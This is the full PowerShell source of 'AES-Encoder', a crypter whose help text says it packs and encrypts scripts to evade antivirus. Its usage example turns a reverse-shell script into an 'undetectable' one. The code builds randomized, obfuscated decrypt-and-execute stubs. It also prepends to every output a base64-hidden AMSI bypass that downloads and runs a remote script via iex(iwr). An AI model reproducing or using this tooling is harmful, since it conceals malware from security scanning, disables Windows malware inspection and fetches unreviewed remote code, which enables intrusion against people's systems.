#    AES-Encoder - PowerShell crypter
#    Copyright (C) 2022 Chainski 
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
#    Made by https://github.com/chainski

$console = $host.UI.RawUI
$console.WindowTitle = "Powershell AES-Encoder"
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function random {
$base64String = [Convert]::ToBase64String((1..5 | ForEach-Object {[byte](Get-Random -Max 256)}))
$base64String = $base64String -replace '[+/=]', ''
return $base64String
}

function Invoke-AES-Encoder {
    <#
    .SYNOPSIS

    Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
	It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.

    .DESCRIPTION

     Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.


    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.

    .PARAMETER OutFile
    Specifies the output script.

    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 4.

    .EXAMPLE

    PS> Invoke-AES-Encoder -InFile reverse-shell.ps1 -OutFile undetectable.ps1 -Iterations 12

    .LINK

    https://github.com/chainski/AES-Encoder

    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 4
    )

    Process {
Write-Host `r`n
Write-Host -ForegroundColor Red   "  ░░░░░  ░░░░░░░ ░░░░░░░     ░░░░░░░ ░░░    ░░  ░░░░░░  ░░░░░░  ░░░░░░  ░░░░░░░ ░░░░░░  "
Write-Host -ForegroundColor White " ▒▒   ▒▒ ▒▒      ▒▒          ▒▒      ▒▒▒▒   ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒      ▒▒   ▒▒ "
Write-Host -ForegroundColor Red   " ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒▒     ▒▒▒▒▒   ▒▒ ▒▒  ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  "
Write-Host -ForegroundColor White " ▓▓   ▓▓ ▓▓           ▓▓     ▓▓      ▓▓  ▓▓ ▓▓ ▓▓      ▓▓    ▓▓ ▓▓   ▓▓ ▓▓      ▓▓   ▓▓ "
Write-Host -ForegroundColor Red   " ██   ██ ███████ ███████     ███████ ██   ████  ██████  ██████  ██████  ███████ ██   ██ "
Write-Host -ForegroundColor	Blue   "                         ╔═════════════════════════════════════════╗                   "                         
Write-Host -ForegroundColor White  "                         ║          AES Encoder 1.0.0.0            ║                   "
Write-Host -ForegroundColor Blue   "                         ║           coded by Chainski             ║                   "
Write-Host -ForegroundColor White  "                         ║      For Educational Purposes Only      ║                   "
Write-Host -ForegroundColor Red    "                         ║                 Github                  ║                   "
Write-Host -ForegroundColor White  "                         ║ https://github.com/chainski/AES-Encoder ║                   "  
Write-Host -ForegroundColor Blue   "                         ╚═════════════════════════════════════════╝                   "  

Write-Host `r`n
sleep 1
        # read
        Write-Host "[*] Reading '$($infile)' ..." 
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            
            Write-Host "[*] Starting Encryption Process ..." -ForegroundColor Red 
            $paddingmodes = 'pKCs7','Iso10126','anSIx923','ZeROs'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermode = 'CbC'
            $keysize = 256
            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Host "[*] Compressing ..." 
            [System.IO.MemoryStream] $output = &(GCM *w-o*t) System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = &(GCM *w-o*t) System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = &(GCM *w-o*t) System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
      	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Host "[*] Generating Encryption Key ..." 
            
			$aesManaged = &(GCM *w-o*t) "System.Security.Cryptography.AesManaged"

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }
			
			$aesManaged.bLOcKSiZe = 128
            $aesManaged.keysiZE = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Host "[*] Encrypting with AES ..." -ForegroundColor Red 
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
		    Write-Host "[*] Randomizing Cases ..."
            # write
            Write-Host "[*] Obfuscating Layers ..."
			
			# ADDED AMSI Bypass 5/18/2024
            $amsi = '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x' + "`r`n"
            $stub_template = ''

            $code_alternatives  = @()
           
            $code_alternatives += '${2} = [cOnvert]::frOMbASe64striNg("{0}")' + "`r`n"
            $code_alternatives += '${3} = [CoNVerT]::froMbase64STRing("{1}")' + "`r`n"
            $code_alternatives += '${4} = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''
               
            $code_alternatives  = @()
            $code_alternatives += '${4}.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::'+$CIpHerMoDE + "`r`n"
            $code_alternatives += '${4}.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::'+$paddingmode + "`r`n"
            $code_alternatives += '${4}.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)' + "`r`n"         
            $code_alternatives += '${4}.kEysIZe = ((10+166-20*2)+(97)+(12+11))' + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.Iv = ${2}[0..15]' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives 
            $stub_template += $code_alternatives_shuffled -join ''
            
            $code_alternatives  = @()
            $code_alternatives += '${6} = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,${4}.CreAteDecRYpToR().tRANsFOrMFiNALbLocK(${2},16,${2}.Length-16))' + "`r`n"
            $code_alternatives += '${7} = &(GCM *w-o*t) System.IO.MemoryStream' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''
            
            
            if ($compressiontype -eq "Gzip") {
                $stub_template += '${5} = &(GCM *w-o*t) SYSTEm.iO.compressiOn.GzipSTrEAm ${6}, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${5} = &(GCM *w-o*t) sYsTEM.iO.comPresSION.DEFLATEsTream ${6}, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)' + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"
            
            $code_alternatives  = @()
            $code_alternatives += '${5}.CLoSe()' + "`r`n"
            $code_alternatives += '${4}.dISPOsE()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${8} = [TeXT.EnCOdInG]::UtF8.GetStriNG(${7}.tOARRAY())' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''
            
            $stub_template += ('i`Ex','I`e`X','i"e"x','&(gcm i*x)' | Get-Random)+'(${8})' + "`r`n"
            
             # it's ugly, but it beats concatenating each value manually.
            $code =  $stub_template -f $b64encrypted, $b64key, (random), (random), (random), (random), (random), (random), (random), (random)
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Output "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$amsi+$code)
        Write-Output "[+] Done!"
    }
}
